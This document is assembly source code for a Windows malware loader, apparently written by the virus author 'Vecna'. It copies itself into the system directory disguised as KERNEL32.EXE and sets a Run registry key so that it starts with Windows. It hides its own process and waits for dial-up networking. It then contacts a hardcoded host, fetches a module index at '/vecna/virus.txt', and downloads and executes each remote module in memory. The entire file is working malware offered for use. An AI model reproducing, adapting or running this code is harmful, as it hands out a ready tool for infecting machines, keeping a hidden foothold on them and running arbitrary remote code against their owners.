.586p
.model flat
locals

       ofs equ offset
       by  equ byte ptr
       wo  equ word ptr
       dwo equ dword ptr
       fwo equ fword ptr

       TRUE  EQU 1
       FALSE EQU 0

       CRLF  equ <13,10>

       MAX_PATH equ 260

       WAIT_TIME equ 60

       LOADER_VERSION equ 0001                  ;0.01

       RUNNING equ -1
       COPIED  equ -2
       RIGHT   equ -3

extrn VirtualAlloc:PROC
extrn VirtualFree:PROC
extrn ExitProcess:PROC
extrn socket:PROC
extrn connect:PROC
extrn closesocket:PROC
extrn WSAGetLastError:PROC
extrn WSACleanup:PROC
extrn WSAStartup:PROC
extrn send:PROC
extrn recv:PROC
extrn GetModuleHandleA:PROC
extrn GetProcAddress:PROC
extrn IsBadWritePtr:PROC
extrn WriteProfileStringA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetModuleFileNameA:PROC
extrn CopyFileA:PROC
extrn WinExec:PROC
extrn Sleep:PROC
extrn SetErrorMode:PROC
extrn CloseHandle:PROC
extrn SetFileAttributesA:PROC
extrn PeekMessageA:PROC
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC

.data

include module.inc
include process.inc

index   db '/vecna/virus.txt', 0

url     db 'sok4ever.zone.ne.jp', 0

key     db "Software\Microsoft\Windows\CurrentVersion\Run",0

request db ' HTTP/1.1', CRLF
        db 'User-Agent: Mozilla/4.0 (compatible; Vecna) ', CRLF
        db 'Accept: image/gif, image/x-xbitmap, image/jpeg, */*', CRLF
        db 'Host: ', 0

       db '\'
_name  db 'KERNEL32'
_dot   db '.'
       db 'EXE', 0
_name_sz equ $-_name

createthlsnaps  db 'CreateToolhelp32Snapshot', 0
proc32first     db 'Process32First', 0
proc32next      db 'Process32Next', 0
GetModHandle    db 'GetModuleHandleA', 0
GetProcAdd      db 'GetProcAddress', 0
RegisterService db 'RegisterServiceProcess', 0

.data?
creatthp32snp dd ?
snap          dd ?
done          dd ?
temp_esp      dd ?
index_end     dd ?
_socket       dd ?
memory        dd ?
save_esp      dd ?
regserv       dd ?
getmhnd       dd ?
getproc       dd ?
proc32f       dd ?
proc32n       dd ?
shit          dd ?, ?
buffer        db 1000 dup (?)
recurse       db ?

.code

start  proc
       cld

       push 8003h
       call SetErrorMode               ;turn off all errors

       call get_apis

       sub eax, eax
       push eax
       push 1
       push eax
       push eax
       push ofs buffer
       call PeekMessageA

       call HideProcess

       call install

       cmp dl, RUNNING
       je @@error                      ;already installed

       cmp dl, COPIED
       je @@exec                       ;spawn installed copy

       ;RIGHT
       mov dwo [done], 0               ;inet modules dont get yet

  @@fine:
       push ofs @@remove_seh
       push dwo fs:[0]
       mov fs:[0], esp                 ;set SEH
       mov [temp_esp], esp

       call install_http

  @@remove_seh:
       mov esp, [temp_esp]             ;remove SEH
       pop dwo fs:[0]
       pop eax

       cmp dwo [done], -1
       je @@error                      ;modules processed... :)

       push WAIT_TIME*1000
       call Sleep                      ;wait some time

       jmp @@fine                      ;try reconnect

  @@exec:
       push 0
       push ofs buffer
       call WinExec                    ;re-exec updater

  @@error:
       push 0
       call ExitProcess
start  endp


install proc
       sub esp, MAX_PATH
       mov ebp, esp                    ;create stack buffer

       push MAX_PATH
       push ofs buffer
       call GetSystemDirectoryA
       test eax, eax
       jz @@done

       add eax, ofs buffer
       mov edi, eax
       mov esi, ofs _name-1
       mov ecx, _name_sz+1
       rep movsb                       ;build installation name

       push 0
       call GetModuleHandleA
       test eax, eax
       jz @@done
       push MAX_PATH
       push ebp                        ;stack buffer
       push eax
       call GetModuleFileNameA         ;get current name
       test eax, eax
       jz @@done

       mov esi, ofs buffer
       mov edi, ebp
       mov edx, RIGHT                  ;compare names
  @@check:
       inc edi
       lodsb
       test al, al
       jz @@xxx                        ;names match? already installed
       cmp [edi-1], al
       je @@check

       push 0
       push ofs buffer
       push ebp
       call CopyFileA                  ;create copy
       test eax, eax
       jz @@done

       sub ebp, ebp
       push ofs shit+4
       push ofs shit
       push ebp
       push 0f003fh
       push ebp
       push ebp
       push ebp
       push ofs key
       push 80000002h
       call RegCreateKeyExA
       test eax, eax
       jnz @@3

       push 12
       push ofs _name
       push 1
       push ebp
       push ofs _name
       push dwo [shit]
       call RegSetValueExA

       push dwo [shit]
       call RegCloseKey

  @@3:
       mov edx, COPIED
       jmp @@xxx

  @@done:
       mov edx, RUNNING

  @@xxx:
       add esp, MAX_PATH
       ret
install endp


http   proc
       cmp by [recurse], 0
       jne @@fuck
       inc by [recurse]

       sub esp, 12+256+128+2+2         ;temporary stack buffer
       push esp
       push 101h
       call WSAStartup                 ;init inet
       add esp, 12+256+128+2+2
       test eax, eax
       jnz @@fuck000

       push 40h
       push 1000h+2000h+100000h
       push 32*1024
       push 0
       call VirtualAlloc               ;grab some memory
       mov [memory], eax
       test eax, eax
       jz @@fuck001

       push [memory]
       push ofs index
       push ofs url
       call get_page                   ;read modules index
       jc @@fuck002

       mov edi, [memory]
       add edi, eax
       mov [index_end], edi

  @@next_module:
       call make_path                  ;get next module filename
       jnb @@fuck002

       pushad

       push edi
       push ofs buffer
       push ofs url
       call get_page                   ;get module
       jc @@invalid_module

       cmp [ecx.m_header], M_SIGN
       jne @@invalid_module
       cmp [ecx.m_version], LOADER_VERSION
       ja @@invalid_module
       movzx eax, wo [ecx.m_flags]
       and eax, M_PLAIN+M_COMPATIBLE+M_NOCRC+M_EXTHDR
       cmp eax, M_PLAIN+M_COMPATIBLE+M_NOCRC
       jne @@invalid_module            ;can we execute this module?

       mov edi, [ecx.m_entry]
       add edi, ecx                    ;calculate entrypoint of module

       push ofs @@fault
       push dwo fs:[0]
       mov fs:[0], esp
       mov [save_esp], esp             ;set SEH

       push LOADER_VERSION
       push dwo [getmhnd]
       push dwo [getproc]
       call edi                        ;run module

       mov dwo [done], -1              ;modules executed

  @@fault:
       mov esp, [save_esp]
       pop dwo fs:[0]                  ;remove SEH
       pop eax

  @@invalid_module:
       popad
       jmp @@next_module               ;get next module

  @@fuck002:
       push 8000h+4000h
       push 32*1024
       push edi
       call VirtualFree                ;free da memory

  @@fuck001:
       call WSACleanup                 ;switch off inet

  @@fuck000:
       mov by [recurse], 0

  @@fuck:
       ret
http   endp


safesend proc
       pusha
  @@retry:
       mov eax, [esp+4+(8*4)]
       mov ecx, [esp+8+(8*4)]

       push 0
       push ecx
       push eax
       push dwo [_socket]
       call send                       ;send stuff

       mov ecx, eax
       inc ecx
       jnz @@done                      ;packet send!

       call WSAGetLastError
       sub eax, 10035
       jz @@retry                      ;retry if problem is blocking

       stc                             ;signal error
       db 0b1h
  @@done:
       clc                             ;smart, isnt ;)

       mov [esp+(7*4)], eax            ;update EAX stack copy
       popa
       ret 2*4
safesend endp


saferecv proc
       pusha
  @@retry:
       mov eax, [esp+4+(8*4)]
       mov ecx, [esp+8+(8*4)]          ;get paramz

       push 0
       push ecx
       push eax
       push dwo [_socket]
       call recv                       ;receive stuffs

       mov ecx, eax
       inc ecx
       jnz @@done                      ;no error, return

       call WSAGetLastError
       sub eax, 10035
       jz @@retry                      ;continue trying if problem is block

       stc
       db 0b1h
  @@done:
       clc

       mov [esp+(7*4)], eax
       popa
       ret 2*4
saferecv endp


get_page proc
       pusha

       push 0
       push 1
       push 2
       call socket
       mov [_socket], eax
       inc eax
       jz @@fuck000

       push 0                          ;
       push 0                          ;
       push 01514A9D2h                 ;
       push 050000002h                 ;build data structure in stack :)
       mov esi, esp                    ;

       push 16
       push esi
       push dwo [_socket]
       call connect                    ;try to connect to sok4ever

       sub esp, -16                    ;free structure

       test eax, eax
       jnz @@fuck001                   ;no error connecting :)

       mov edi, [esp+12+(8*4)]         ;edi=work buffer

       push 1000h
       push edi
       call IsBadWritePtr              ;make sure we have enought room
       test eax, eax
       jnz @@fuck001

       mov eax, ' TEG'
       stosd
       mov esi, [esp+8+(8*4)]
       call strcpy
       mov esi, ofs request            ;build request
       call strcpy
       mov esi, [esp+4+(8*4)]
       call strcpy
       mov eax, 0A0D0A0Dh
       stosd
       sub edi, [esp+12+(8*4)]         ;edi=size of request

       push edi
       push dwo [esp+12+4+(8*4)]
       call safesend                   ;send http request
       jc @@fuck001

       mov ebx, [esp+12+(8*4)]
  @@next:
       push 4*1024
       push ebx
       call saferecv                   ;read html page from server :)
       jc @@fuck001
       add ebx, eax
       test eax, eax                   ;all read?
       jnz @@next

       mov esi, [esp+12+(8*4)]
       sub ebx, esi
       mov [esp+(7*4)], ebx            ;return ecx=total http page size

       cmp [esi], 'PTTH'
       jne @@fuck001                   ;HTTP signature?

       mov ecx, 'tnoC'
       xchg ebx, ecx
  @@search:
       lodsb
       cmp al, bl
       jne @@isnt
       cmp [esi-1], ebx
       jne @@isnt
       cmp [esi+3], '-tne'
       jne @@isnt
       cmp [esi+7], 'epyT'
       je @@data
  @@isnt:
       loop @@search                   ;search start of data area!
       jecxz @@fuck001

  @@data:
       inc esi
       cmp [esi-4], 0a0d0a0dh          ;skip spaces...
       jne @@data

       mov [esp+(6*4)], esi            ;return eax=module start

       push [_socket]
       call closesocket                ;close it
       mov [_socket], eax

       clc
       jmp @@fuck999

  @@fuck001:
       push [_socket]
       call closesocket
       mov [_socket], eax

  @@fuck000:
       stc

  @@fuck999:
       popa
       ret 3*4
get_page endp


strcpy proc
       lodsb
       test al, al
       je @@done
       stosb                           ;hmm...
       jmp strcpy
  @@done:
       ret
strcpy endp


is_letter proc
       cmp by [esi], '.'
       je @@ok
       cmp by [esi], 'A'
       jb @@bahh
       cmp by [esi], 'z'               ;check for valid filename for module
       ja @@bahh
       cmp by [esi], 'Z'
       jbe @@ok
       cmp by [esi], 'a'
       jae @@ok
  @@bahh:
       clc
       db 0b0h                         ;this trick is (c) Vecna :P
  @@ok:
       stc
       ret
is_letter endp


make_path proc
       pusha
       mov esi, ecx

  @@next:
       call is_letter
       jc @@ok                         ;skip non-path chars
  @@bahh:
       inc esi
       jmp @@next
  @@ok:

       mov edi, ofs buffer
       mov eax, dwo [index]
       stosd
       mov eax, dwo [index+4]          ;make directory
       stosd
       dec edi

  @@next2:
       call is_letter
       jnc @@end                       ;copy filename
       movsb
       jmp @@next2

  @@end:
       sub eax, eax                    ;terminatorz
       stosd

       mov [esp+(6*4)], esi            ;return ecx=updated list
       cmp esi, [index_end]
       popa
       ret
make_path endp


HideProcess PROC
       push 1
       push 0
       call [regserv]                  ;documented way
  @@error:
       call @@seh
       mov esp, [esp+8]
       jmp @@fault
  @@seh:
       push dwo fs:[0]
       mov dwo fs:[0], esp             ;modo incorreto(so por via das duvidas)
       push -10h
       pop eax
       add eax, fs:[eax+28h]           ;pega TIB
       mov eax, dwo [eax+8]
       or dwo [eax+20h], 180h          ;nukeprocess+serviceprocess
  @@fault:
       pop dwo fs:[0]
       pop eax
       ret
HideProcess ENDP


install_http proc
       push 0
       push TH32CS_SNAPPROCESS
       mov ecx, [creatthp32snp]
       jecxz @@fuck                    ;damn
       call ecx
       mov [snap], eax
       dec eax
       jz @@no_inet
       mov dwo [buffer], size PROCESSENTRY32
       push ofs buffer
       push dwo [snap]
       call [proc32f]                  ;get first process
  @@next:
       test eax, eax
       jz @@no_inet                    ;no more processes?
       sub eax, eax
       lea edi, [buffer.szExeFile]
       repnz scasb                     ;seek end
       std
       mov al, '\'
       repnz scasb                     ;seek start of filename
       cld
       mov eax, [edi+2]
       or eax, 20202020h
       cmp eax, 'aanr'                 ;is RNAAPP.EXE running?
       je @@http
       push ofs buffer
       push dwo [snap]
       call [proc32n]                  ;get next process
       jmp @@next
  @@http:
       push [snap]
       call CloseHandle
       call http
       ret
  @@fuck:
       call http                       ;try connect 'na marra' :)
  @@no_inet:
       ret
install_http endp


get_apis proc
       mov by [_dot], 0
       push ofs _name
       call GetModuleHandleA           ;kernel32 address
       mov by [_dot], '.'

       push ofs createthlsnaps
       push eax
       push ofs proc32next
       push eax
       push ofs proc32first
       push eax
       push ofs GetProcAdd
       push eax
       push ofs GetModHandle
       push eax
       push ofs RegisterService        ;push all paramz at once
       push eax

       lea edi, [GetProcAddress]

       call edi
       mov [regserv], eax
       call edi
       mov [getmhnd], eax
       call edi
       mov [getproc], eax              ;get APIs
       call edi
       mov [proc32f], eax
       call edi
       mov [proc32n], eax
       call edi
       mov [creatthp32snp], eax

       clc
       db 0b0h
  @@error:
       stc
       ret
get_apis endp


end    start
